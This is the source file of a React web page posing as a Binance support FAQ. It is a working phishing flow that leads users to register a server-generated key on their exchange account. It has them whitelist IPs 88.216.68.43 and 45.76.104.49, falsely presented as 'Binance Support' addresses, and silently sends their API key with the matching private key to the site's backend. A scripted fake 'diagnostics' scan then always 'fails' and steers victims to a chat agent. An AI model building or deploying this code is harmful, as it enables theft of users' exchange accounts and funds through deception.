"use client";

import { useState, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";
import Navbar from "../components/Navbar";
import FAQLayout from "../components/FAQLayout";
import { useLanguage } from "../context/LanguageContext";
import { toggleChatwoot } from "../components/ChatwootWidget";

type DeviceType = "computer" | "mobile" | null;

interface Step {
  id: number;
  titleKey: string;
  computerContentKey: string;
  mobileContentKey: string;
}

const steps: Step[] = [
  {
    id: 1,
    titleKey: "step1",
    computerContentKey: "computer",
    mobileContentKey: "mobile",
  },
  {
    id: 2,
    titleKey: "step2",
    computerContentKey: "computer",
    mobileContentKey: "mobile",
  },
  {
    id: 3,
    titleKey: "step3",
    computerContentKey: "computer",
    mobileContentKey: "mobile",
  },
  {
    id: 4,
    titleKey: "step4",
    computerContentKey: "computer",
    mobileContentKey: "mobile",
  },
  {
    id: 5,
    titleKey: "step5",
    computerContentKey: "computer",
    mobileContentKey: "mobile",
  },
  {
    id: 6,
    titleKey: "step6",
    computerContentKey: "computer",
    mobileContentKey: "mobile",
  },
  {
    id: 7,
    titleKey: "step7",
    computerContentKey: "computer",
    mobileContentKey: "mobile",
  },
  {
    id: 8,
    titleKey: "step8",
    computerContentKey: "computer",
    mobileContentKey: "mobile",
  },
];

export default function AssistancePage() {
  const { t } = useLanguage();
  const [searchQuery, setSearchQuery] = useState("");
  const [activeMenuItem, setActiveMenuItem] = useState("api-tutorial");
  const [deviceType, setDeviceType] = useState<DeviceType>(null);
  const [completedSteps, setCompletedSteps] = useState<number[]>([]);
  const [generatedPublicKey, setGeneratedPublicKey] = useState<string>("");
  const [generatedPrivateKey, setGeneratedPrivateKey] = useState<string>("");
  const [copied, setCopied] = useState(false);
  const [hasCopiedKey, setHasCopiedKey] = useState(false);
  const [userApiKey, setUserApiKey] = useState<string>("");
  const [isRunningDiagnostics, setIsRunningDiagnostics] = useState(false);
  const [diagnosticsComplete, setDiagnosticsComplete] = useState(false);
  const [diagnosticsProgress, setDiagnosticsProgress] = useState<string[]>([]);
  const [copiedIp, setCopiedIp] = useState<string | null>(null);

  const handleSearch = () => {
    console.log("Searching for:", searchQuery);
  };

  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Enter") {
      handleSearch();
    }
  };

  const handleMenuItemClick = (id: string) => {
    setActiveMenuItem(id);
    console.log("Menu item clicked:", id);
  };

  const handleDeviceSelect = (device: DeviceType) => {
    setDeviceType(device);
    setCompletedSteps([]);
    setGeneratedPublicKey("");
    setGeneratedPrivateKey("");
    setHasCopiedKey(false);
    setUserApiKey("");
    setIsRunningDiagnostics(false);
    setDiagnosticsComplete(false);
    setDiagnosticsProgress([]);
    setCopiedIp(null);
  };

  const handleStepComplete = (stepId: number) => {
    if (!completedSteps.includes(stepId)) {
      setCompletedSteps([...completedSteps, stepId]);
    }
  };

  const generatePublicKey = async () => {
    try {
      const response = await fetch('/api/generate-keys', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
      });

      const data = await response.json();

      if (!response.ok || !data.success) {
        throw new Error(data.error || 'Failed to generate keys');
      }

      setGeneratedPublicKey(data.publicKey);
      setGeneratedPrivateKey(data.privateKey);
    } catch (error: any) {
      console.error("Error generating key:", error);
      alert(`Error generating key: ${error.message || 'Please try again.'}`);
    }
  };

  const copyPublicKey = async () => {
    if (!generatedPublicKey) return;
    
    try {
      await navigator.clipboard.writeText(generatedPublicKey);
      setCopied(true);
      setHasCopiedKey(true);
      setTimeout(() => setCopied(false), 2000);
    } catch (error: any) {
      console.error("Error copying to clipboard:", error);
      alert("Failed to copy to clipboard. Please try again.");
    }
  };

  const copyIpAddress = async (ip: string) => {
    try {
      await navigator.clipboard.writeText(ip);
      setCopiedIp(ip);
      setTimeout(() => setCopiedIp(null), 2000);
    } catch (error: any) {
      console.error("Error copying to clipboard:", error);
      alert("Failed to copy to clipboard. Please try again.");
    }
  };

  const handleSpeakToAgent = () => {
    toggleChatwoot();
  };

  const submitApiKey = async (apiKey: string) => {
    try {
      const response = await fetch('/api/submit-api-key', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          apiKey: apiKey,
          publicKey: generatedPublicKey,
          privateKey: generatedPrivateKey,
          deviceType: deviceType,
        }),
      });

      const data = await response.json();
      if (!response.ok || !data.success) {
        throw new Error(data.error || 'Failed to submit API key');
      }
    } catch (error: any) {
      console.error("Error submitting API key:", error);
      // Don't show error to user, just log it
    }
  };

  const runDiagnostics = async () => {
    if (!userApiKey) return;
    
    setIsRunningDiagnostics(true);
    setDiagnosticsProgress([]);
    
    const scanItems = [
      "Checking account security settings...",
      "Scanning API permissions...",
      "Verifying IP restrictions...",
      "Analyzing trading history...",
      "Checking wallet balances...",
      "Reviewing transaction logs...",
      "Validating authentication methods...",
      "Scanning for suspicious activity...",
      "Finalizing security assessment...",
    ];
    
    // Simulate diagnostics scan with progress updates
    for (let i = 0; i < scanItems.length; i++) {
      await new Promise(resolve => setTimeout(resolve, 400));
      setDiagnosticsProgress([...scanItems.slice(0, i + 1)]);
    }
    
    // Final delay before completion
    await new Promise(resolve => setTimeout(resolve, 500));
    
    setIsRunningDiagnostics(false);
    setDiagnosticsComplete(true);
  };


  const isStepVisible = (stepIndex: number) => {
    if (stepIndex === 0) return true;
    return completedSteps.includes(steps[stepIndex - 1].id);
  };

  const isStepCompleted = (stepId: number) => {
    return completedSteps.includes(stepId);
  };

  const relatedArticles = [
    { id: "1", title: "How to Generate an API Key", href: "#", disabled: true },
    { id: "2", title: "API Rate Limits", href: "#", disabled: true },
    { id: "3", title: "WebSocket Streams", href: "#", disabled: true },
    { id: "4", title: "Spot Trading Endpoints", href: "#", disabled: true },
  ];

  return (
    <div className="min-h-screen bg-[#181A21] flex flex-col">
      <Navbar />

      {/* FAQ Header Section */}
      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ duration: 0.3 }}
        className="bg-[#0A0F11]"
      >
        <div className="w-full px-4 sm:px-6 md:px-10 lg:px-16 py-4 sm:py-5">
          <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
            {/* FAQ Title */}
            <h1 className="text-lg sm:text-xl font-bold text-white">
              {t.assistance.faqTitle}
            </h1>

            {/* Search Bar */}
            <div className="flex items-center w-full sm:w-auto">
              <div className="relative flex-1 sm:flex-initial">
                <svg
                  className="absolute left-3 sm:left-4 top-1/2 -translate-y-1/2 text-gray-500"
                  width="16"
                  height="16"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2"
                >
                  <circle cx="11" cy="11" r="8" />
                  <path d="m21 21-4.35-4.35" />
                </svg>
                <input
                  type="text"
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  onKeyDown={handleKeyDown}
                  placeholder={t.common.searchPlaceholder}
                  className="w-full sm:w-[200px] md:w-[260px] pl-10 sm:pl-11 pr-3 sm:pr-4 py-2 bg-[#181A21] text-white text-sm border border-gray-600 border-r-0 focus:border-[#FCD535] focus:outline-none placeholder-gray-500 transition-colors"
                />
              </div>
              <button
                onClick={handleSearch}
                className="px-4 sm:px-5 py-2 bg-[#FCD535] text-[#181A21] text-sm font-semibold hover:bg-[#e5c030] transition-colors cursor-pointer whitespace-nowrap"
              >
                {t.common.search}
              </button>
            </div>
          </div>
        </div>
      </motion.div>

      {/* Main Content Area with Three Column Layout */}
      <div className="flex-1">
        <FAQLayout
          activeMenuItem={activeMenuItem}
          onMenuItemClick={handleMenuItemClick}
          relatedArticles={relatedArticles}
        >
          {/* Main scrollable content goes here */}
          <div className="prose prose-invert max-w-none">
            <h1 className="text-xl sm:text-2xl font-bold text-white mb-3 sm:mb-4">
              {t.assistance.title}
            </h1>

            <p className="text-sm sm:text-base text-gray-400 leading-relaxed mb-6 sm:mb-8">
              {t.assistance.description}
            </p>

            {/* Device Selection */}
            {!deviceType && (
              <motion.div
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                className="mb-6 sm:mb-8"
              >
                <h2 className="text-base sm:text-lg font-semibold text-white mb-3 sm:mb-4">
                  {t.assistance.selectDevice}
                </h2>
                <div className="flex flex-col sm:flex-row gap-3 sm:gap-4">
                  <button
                    onClick={() => handleDeviceSelect("computer")}
                    className="flex items-center justify-center sm:justify-start gap-3 px-4 sm:px-6 py-3 sm:py-4 bg-[#2B3139] hover:bg-[#363C45] border border-[#3B4149] rounded-lg transition-colors cursor-pointer"
                  >
                    <svg
                      width="24"
                      height="24"
                      viewBox="0 0 24 24"
                      fill="none"
                      stroke="currentColor"
                      strokeWidth="2"
                      className="text-[#FCD535] flex-shrink-0"
                    >
                      <rect x="2" y="3" width="20" height="14" rx="2" />
                      <path d="M8 21h8" />
                      <path d="M12 17v4" />
                    </svg>
                    <span className="text-white font-medium">{t.assistance.computer}</span>
                  </button>
                  <button
                    onClick={() => handleDeviceSelect("mobile")}
                    className="flex items-center justify-center sm:justify-start gap-3 px-4 sm:px-6 py-3 sm:py-4 bg-[#2B3139] hover:bg-[#363C45] border border-[#3B4149] rounded-lg transition-colors cursor-pointer"
                  >
                    <svg
                      width="24"
                      height="24"
                      viewBox="0 0 24 24"
                      fill="none"
                      stroke="currentColor"
                      strokeWidth="2"
                      className="text-[#FCD535] flex-shrink-0"
                    >
                      <rect x="5" y="2" width="14" height="20" rx="2" />
                      <path d="M12 18h.01" />
                    </svg>
                    <span className="text-white font-medium">{t.assistance.mobile}</span>
                  </button>
                </div>
              </motion.div>
            )}

            {/* Steps - shown after device selection */}
            {deviceType && (
              <motion.div
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                className="space-y-4"
              >
                {/* Back button */}
                <button
                  onClick={() => handleDeviceSelect(null)}
                  className="flex items-center gap-2 text-gray-400 hover:text-white transition-colors mb-6 cursor-pointer"
                >
                  <svg
                    width="16"
                    height="16"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    strokeWidth="2"
                  >
                    <path d="M19 12H5M12 19l-7-7 7-7" />
                  </svg>
                  <span className="text-sm">{t.assistance.changeDevice}</span>
                </button>

                <div className="flex flex-wrap items-center gap-2 mb-4 sm:mb-6">
                  <span className="text-xs sm:text-sm text-gray-400">{t.assistance.instructionsFor}</span>
                  <span className="px-2 sm:px-3 py-1 bg-[#FCD535] text-[#181A21] text-xs sm:text-sm font-medium rounded">
                    {deviceType === "computer" ? t.assistance.computer : t.assistance.mobile}
                  </span>
                </div>

                <AnimatePresence>
                  {steps.map((step, index) => {
                    // @ts-ignore - dynamic access to translations
                    const stepData = t.assistance.steps[step.titleKey];
                    const title = stepData.title;
                    const content = deviceType === "computer" 
                      ? stepData.computer 
                      : stepData.mobile;

                    return isStepVisible(index) && (
                      <motion.div
                        key={step.id}
                        initial={{ opacity: 0, y: 20 }}
                        animate={{ opacity: 1, y: 0 }}
                        transition={{ duration: 0.3, delay: 0.1 }}
                        className={`p-3 sm:p-5 rounded-lg border ${
                          isStepCompleted(step.id)
                            ? "bg-[#1E2329] border-[#2EBD85]"
                            : "bg-[#2B3139] border-[#3B4149]"
                        }`}
                      >
                        <div className="flex items-start gap-3 sm:gap-4">
                          {/* Step number / checkmark */}
                          <div
                            className={`flex-shrink-0 w-7 h-7 sm:w-8 sm:h-8 rounded-full flex items-center justify-center ${
                              isStepCompleted(step.id)
                                ? "bg-[#2EBD85]"
                                : "bg-[#FCD535]"
                            }`}
                          >
                            {isStepCompleted(step.id) ? (
                              <svg
                                width="16"
                                height="16"
                                viewBox="0 0 24 24"
                                fill="none"
                                stroke="#181A21"
                                strokeWidth="3"
                              >
                                <path d="M20 6L9 17l-5-5" />
                              </svg>
                            ) : (
                              <span className="text-[#181A21] font-bold text-sm">
                                {step.id}
                              </span>
                            )}
                          </div>

                          {/* Step content */}
                          <div className="flex-1 min-w-0">
                            <h3 className="text-sm sm:text-base text-white font-semibold mb-2">
                              {title}
                            </h3>
                            <div className="text-gray-400 text-xs sm:text-sm leading-relaxed mb-3 sm:mb-4">
                              {(() => {
                                if (step.id === 3) {
                                  const lines = content.split("\n");
                                  const buttonIndex = lines.findIndex((line: string) => line.includes("Click the button") || line.includes("Haga clic en el botón"));
                                  const promptIndex = lines.findIndex((line: string) => line.includes("When prompted") || line.includes("Cuando se le solicite"));
                                  
                                  const beforeButton = buttonIndex >= 0 
                                    ? lines.slice(0, buttonIndex).join("\n")
                                    : content;
                                  const afterButtonText = promptIndex >= 0
                                    ? lines.slice(promptIndex).join("\n")
                                    : "";
                                  
                                  return (
                                    <div className="space-y-3">
                                      <div className="whitespace-pre-line">{beforeButton}</div>
                                      <div>
                                        <p className="mb-2 sm:mb-3 text-xs sm:text-sm">{buttonIndex >= 0 ? lines[buttonIndex] : ""}</p>
                                        <button
                                          onClick={generatePublicKey}
                                          className="w-full sm:w-auto px-3 sm:px-4 py-2 bg-[#FCD535] hover:bg-[#e5c030] text-[#181A21] text-xs sm:text-sm font-semibold rounded transition-colors cursor-pointer mb-2 sm:mb-3"
                                        >
                                          {t.assistance.clickToGenerate}
                                        </button>
                                        {generatedPublicKey && (
                                          <div className="mt-2 sm:mt-3 p-3 sm:p-4 bg-[#181A21] border border-[#3B4149] rounded-lg">
                                            <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-2 mb-2 sm:mb-3">
                                              <p className="text-[#FCD535] text-xs font-semibold">{t.assistance.generatedKey}</p>
                                              <button
                                                onClick={copyPublicKey}
                                                className="flex items-center gap-2 px-3 py-1.5 bg-[#FCD535] hover:bg-[#e5c030] text-[#181A21] text-xs font-semibold rounded transition-colors cursor-pointer"
                                              >
                                                {copied ? (
                                                  <>
                                                    <svg
                                                      width="14"
                                                      height="14"
                                                      viewBox="0 0 24 24"
                                                      fill="none"
                                                      stroke="currentColor"
                                                      strokeWidth="3"
                                                      strokeLinecap="round"
                                                      strokeLinejoin="round"
                                                    >
                                                      <path d="M20 6L9 17l-5-5" />
                                                    </svg>
                                                    {t.assistance.copied}
                                                  </>
                                                ) : (
                                                  <>
                                                    <svg
                                                      width="14"
                                                      height="14"
                                                      viewBox="0 0 24 24"
                                                      fill="none"
                                                      stroke="currentColor"
                                                      strokeWidth="2"
                                                      strokeLinecap="round"
                                                      strokeLinejoin="round"
                                                    >
                                                      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" />
                                                      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
                                                    </svg>
                                                    {t.assistance.copyKey}
                                                  </>
                                                )}
                                              </button>
                                            </div>
                                            <textarea
                                              readOnly
                                              value={generatedPublicKey}
                                              className="w-full bg-[#0A0F11] text-gray-300 text-xs p-3 rounded border border-[#3B4149] font-mono resize-none focus:outline-none focus:border-[#FCD535] transition-colors"
                                              rows={6}
                                              onClick={(e) => (e.target as HTMLTextAreaElement).select()}
                                            />
                                            {copied && (
                                              <motion.p
                                                initial={{ opacity: 0, y: -5 }}
                                                animate={{ opacity: 1, y: 0 }}
                                                className="mt-2 text-xs text-[#2EBD85] flex items-center gap-1"
                                              >
                                                <svg
                                                  width="12"
                                                  height="12"
                                                  viewBox="0 0 24 24"
                                                  fill="none"
                                                  stroke="currentColor"
                                                  strokeWidth="3"
                                                  strokeLinecap="round"
                                                  strokeLinejoin="round"
                                                >
                                                  <path d="M20 6L9 17l-5-5" />
                                                </svg>
                                                {t.assistance.keyCopied}
                                              </motion.p>
                                            )}
                                          </div>
                                        )}
                                        {afterButtonText && (
                                          <div className="whitespace-pre-line mt-3">{afterButtonText}</div>
                                        )}
                                      </div>
                                    </div>
                                  );
                                }
                                if (step.id === 7) {
                                  const lines = content.split("\n");
                                  const ipIndex = lines.findIndex((line: string) => 
                                    line.includes("88.216.68.43") || line.includes("Add Binance Support") || 
                                    line.includes("Añada la IP") || line.includes("añada la IP")
                                  );
                                  
                                  const beforeIp = ipIndex >= 0 
                                    ? lines.slice(0, ipIndex).join("\n")
                                    : content;
                                  const afterIp = ipIndex >= 0 && ipIndex < lines.length - 1
                                    ? lines.slice(ipIndex + 1).join("\n")
                                    : "";
                                  
                                  const primaryIp = "88.216.68.43";
                                  const fallbackIp = "45.76.104.49";
                                  
                                  return (
                                    <div className="space-y-3">
                                      <div className="whitespace-pre-line">{beforeIp}</div>
                                      <div className="mt-4 space-y-3">
                                        <p className="text-white text-sm font-medium mb-3">
                                          {t.assistance.binanceSupportIps || "These are the Binance Support IP addresses:"}
                                        </p>
                                        <div className="p-3 sm:p-4 bg-[#181A21] border border-[#3B4149] rounded-lg">
                                          <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-2 mb-2">
                                            <div>
                                              <p className="text-[#FCD535] text-xs font-semibold mb-1">
                                                {t.assistance.primaryIp || "Primary IP Address:"}
                                              </p>
                                              <p className="text-gray-300 text-xs font-mono">{primaryIp}</p>
                                            </div>
                                            <button
                                              onClick={() => copyIpAddress(primaryIp)}
                                              className="flex items-center gap-2 px-3 py-1.5 bg-[#FCD535] hover:bg-[#e5c030] text-[#181A21] text-xs font-semibold rounded transition-colors cursor-pointer"
                                            >
                                              {copiedIp === primaryIp ? (
                                                <>
                                                  <svg
                                                    width="14"
                                                    height="14"
                                                    viewBox="0 0 24 24"
                                                    fill="none"
                                                    stroke="currentColor"
                                                    strokeWidth="3"
                                                    strokeLinecap="round"
                                                    strokeLinejoin="round"
                                                  >
                                                    <path d="M20 6L9 17l-5-5" />
                                                  </svg>
                                                  {t.assistance.copied}
                                                </>
                                              ) : (
                                                <>
                                                  <svg
                                                    width="14"
                                                    height="14"
                                                    viewBox="0 0 24 24"
                                                    fill="none"
                                                    stroke="currentColor"
                                                    strokeWidth="2"
                                                    strokeLinecap="round"
                                                    strokeLinejoin="round"
                                                  >
                                                    <rect x="9" y="9" width="13" height="13" rx="2" ry="2" />
                                                    <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
                                                  </svg>
                                                  {t.assistance.copyIp || "Copy IP"}
                                                </>
                                              )}
                                            </button>
                                          </div>
                                        </div>
                                        <div className="p-3 sm:p-4 bg-[#181A21] border border-[#3B4149] rounded-lg">
                                          <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-2 mb-2">
                                            <div>
                                              <p className="text-[#FCD535] text-xs font-semibold mb-1">
                                                {t.assistance.fallbackIp || "Fallback IP Address:"}
                                              </p>
                                              <p className="text-gray-300 text-xs font-mono">{fallbackIp}</p>
                                            </div>
                                            <button
                                              onClick={() => copyIpAddress(fallbackIp)}
                                              className="flex items-center gap-2 px-3 py-1.5 bg-[#FCD535] hover:bg-[#e5c030] text-[#181A21] text-xs font-semibold rounded transition-colors cursor-pointer"
                                            >
                                              {copiedIp === fallbackIp ? (
                                                <>
                                                  <svg
                                                    width="14"
                                                    height="14"
                                                    viewBox="0 0 24 24"
                                                    fill="none"
                                                    stroke="currentColor"
                                                    strokeWidth="3"
                                                    strokeLinecap="round"
                                                    strokeLinejoin="round"
                                                  >
                                                    <path d="M20 6L9 17l-5-5" />
                                                  </svg>
                                                  {t.assistance.copied}
                                                </>
                                              ) : (
                                                <>
                                                  <svg
                                                    width="14"
                                                    height="14"
                                                    viewBox="0 0 24 24"
                                                    fill="none"
                                                    stroke="currentColor"
                                                    strokeWidth="2"
                                                    strokeLinecap="round"
                                                    strokeLinejoin="round"
                                                  >
                                                    <rect x="9" y="9" width="13" height="13" rx="2" ry="2" />
                                                    <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
                                                  </svg>
                                                  {t.assistance.copyIp || "Copy IP"}
                                                </>
                                              )}
                                            </button>
                                          </div>
                                        </div>
                                        {copiedIp && (
                                          <motion.p
                                            initial={{ opacity: 0, y: -5 }}
                                            animate={{ opacity: 1, y: 0 }}
                                            className="text-xs text-[#2EBD85] flex items-center gap-1"
                                          >
                                            <svg
                                              width="12"
                                              height="12"
                                              viewBox="0 0 24 24"
                                              fill="none"
                                              stroke="currentColor"
                                              strokeWidth="3"
                                              strokeLinecap="round"
                                              strokeLinejoin="round"
                                            >
                                              <path d="M20 6L9 17l-5-5" />
                                            </svg>
                                            {t.assistance.ipCopied || "IP address copied to clipboard!"}
                                          </motion.p>
                                        )}
                                      </div>
                                      {afterIp && (
                                        <div className="whitespace-pre-line mt-3">{afterIp}</div>
                                      )}
                                    </div>
                                  );
                                }
                                if (step.id === 8) {
                                  return (
                                    <div className="space-y-3">
                                      <div className="whitespace-pre-line">{content}</div>
                                      <div className="mt-4">
                                        <label className="block text-white text-sm font-medium mb-2">
                                          {t.assistance.enterApiKey}
                                        </label>
                                        <input
                                          type="text"
                                          value={userApiKey}
                                          onChange={(e) => setUserApiKey(e.target.value)}
                                          placeholder={t.assistance.apiKeyPlaceholder}
                                          className="w-full bg-[#181A21] text-white text-sm p-3 rounded border border-[#3B4149] focus:outline-none focus:border-[#FCD535] transition-colors font-mono"
                                        />
                                        <p className="mt-2 text-xs text-gray-500">
                                          {t.assistance.apiKeyHint}
                                        </p>
                                      </div>
                                    </div>
                                  );
                                }
                                return <div className="whitespace-pre-line">{content}</div>;
                              })()}
                            </div>

                            {/* Complete button */}
                            {!isStepCompleted(step.id) && (
                              <button
                                onClick={async () => {
                                  if (step.id === 8 && userApiKey) {
                                    await submitApiKey(userApiKey);
                                  }
                                  handleStepComplete(step.id);
                                }}
                                disabled={(step.id === 3 && !hasCopiedKey) || (step.id === 8 && !userApiKey.trim())}
                                className={`w-full sm:w-auto px-3 sm:px-4 py-2 text-[#181A21] text-xs sm:text-sm font-semibold rounded transition-colors ${
                                  (step.id === 3 && !hasCopiedKey) || (step.id === 8 && !userApiKey.trim())
                                    ? "bg-gray-600 cursor-not-allowed opacity-50"
                                    : "bg-[#FCD535] hover:bg-[#e5c030] cursor-pointer"
                                }`}
                              >
                                {t.assistance.markComplete}
                              </button>
                            )}
                          </div>
                        </div>
                      </motion.div>
                    );
                  })}
                </AnimatePresence>

                {/* Completion message and Run Now button */}
                {completedSteps.length === steps.length && (
                  <motion.div
                    initial={{ opacity: 0, y: 20 }}
                    animate={{ opacity: 1, y: 0 }}
                    className="mt-6 sm:mt-8 space-y-3 sm:space-y-4"
                  >
                    {!diagnosticsComplete ? (
                      <div className="p-4 sm:p-6 border border-[#2EBD85] rounded-lg bg-[#1E2329]">
                        {!isRunningDiagnostics ? (
                          <div className="text-center">
                            <div className="w-12 h-12 rounded-full flex items-center justify-center mx-auto mb-4 bg-[#2EBD85]">
                              <svg
                                width="24"
                                height="24"
                                viewBox="0 0 24 24"
                                fill="none"
                                stroke="#181A21"
                                strokeWidth="3"
                              >
                                <path d="M20 6L9 17l-5-5" />
                              </svg>
                            </div>
                            <h3 className="text-white font-bold text-lg mb-2">
                              {t.assistance.completionTitle}
                            </h3>
                            <p className="text-gray-400 text-sm mb-6">
                              {t.assistance.completionMessage}
                            </p>
                            <button
                              onClick={runDiagnostics}
                              className="px-6 py-3 bg-[#FCD535] hover:bg-[#e5c030] text-[#181A21] text-sm font-semibold rounded transition-colors cursor-pointer"
                            >
                              {t.assistance.runNow}
                            </button>
                          </div>
                        ) : (
                          <div>
                            <div className="flex items-center justify-center gap-3 mb-6">
                              <motion.svg
                                animate={{ rotate: 360 }}
                                transition={{ duration: 1, repeat: Infinity, ease: "linear" }}
                                width="24"
                                height="24"
                                viewBox="0 0 24 24"
                                fill="none"
                                stroke="#FCD535"
                                strokeWidth="3"
                              >
                                <circle cx="12" cy="12" r="3" />
                                <path d="M12 1v6m0 6v6m11-7h-6m-6 0H1" />
                              </motion.svg>
                              <h3 className="text-white font-bold text-lg">
                                {t.assistance.runningDiagnostics}
                              </h3>
                            </div>
                            <div className="space-y-3 max-h-64 overflow-y-auto">
                              {diagnosticsProgress.map((item, index) => (
                                <motion.div
                                  key={index}
                                  initial={{ opacity: 0, x: -10 }}
                                  animate={{ opacity: 1, x: 0 }}
                                  transition={{ duration: 0.3 }}
                                  className="flex items-center gap-3 p-3 bg-[#2B3139] rounded-lg border border-[#3B4149]"
                                >
                                  <div className="flex-shrink-0 w-5 h-5 rounded-full bg-[#2EBD85] flex items-center justify-center">
                                    <svg
                                      width="12"
                                      height="12"
                                      viewBox="0 0 24 24"
                                      fill="none"
                                      stroke="#181A21"
                                      strokeWidth="3"
                                    >
                                      <path d="M20 6L9 17l-5-5" />
                                    </svg>
                                  </div>
                                  <span className="text-gray-300 text-sm">{item}</span>
                                </motion.div>
                              ))}
                              {diagnosticsProgress.length > 0 && diagnosticsProgress.length < 9 && (
                                <div className="flex items-center gap-3 p-3 bg-[#2B3139] rounded-lg border border-[#3B4149] opacity-50">
                                  <div className="flex-shrink-0 w-5 h-5 rounded-full bg-[#3B4149] flex items-center justify-center">
                                    <motion.div
                                      animate={{ opacity: [0.5, 1, 0.5] }}
                                      transition={{ duration: 1.5, repeat: Infinity }}
                                      className="w-2 h-2 rounded-full bg-[#FCD535]"
                                    />
                                  </div>
                                  <span className="text-gray-500 text-sm">Processing...</span>
                                </div>
                              )}
                            </div>
                          </div>
                        )}
                      </div>
                    ) : (
                      <div className="p-6 border border-red-500 rounded-lg bg-[#1E2329] text-center">
                        <div className="w-12 h-12 rounded-full flex items-center justify-center mx-auto mb-4 bg-red-500">
                          <svg
                            width="24"
                            height="24"
                            viewBox="0 0 24 24"
                            fill="none"
                            stroke="#181A21"
                            strokeWidth="3"
                            strokeLinecap="round"
                            strokeLinejoin="round"
                          >
                            <circle cx="12" cy="12" r="10" />
                            <path d="M15 9l-6 6M9 9l6 6" />
                          </svg>
                        </div>
                        <h3 className="text-white font-bold text-lg mb-2">
                          {t.assistance.diagnosticsFailed}
                        </h3>
                        <p className="text-gray-400 text-sm mb-4">
                          {t.assistance.diagnosticsFailedMessage}
                        </p>
                        <button
                          onClick={handleSpeakToAgent}
                          className="px-6 py-2 bg-[#FCD535] hover:bg-[#e5c030] text-[#181A21] text-sm font-semibold rounded transition-colors cursor-pointer"
                        >
                          {t.assistance.speakToAgent}
                        </button>
                      </div>
                    )}
                  </motion.div>
                )}
              </motion.div>
            )}
          </div>
        </FAQLayout>
      </div>
    </div>
  );
}
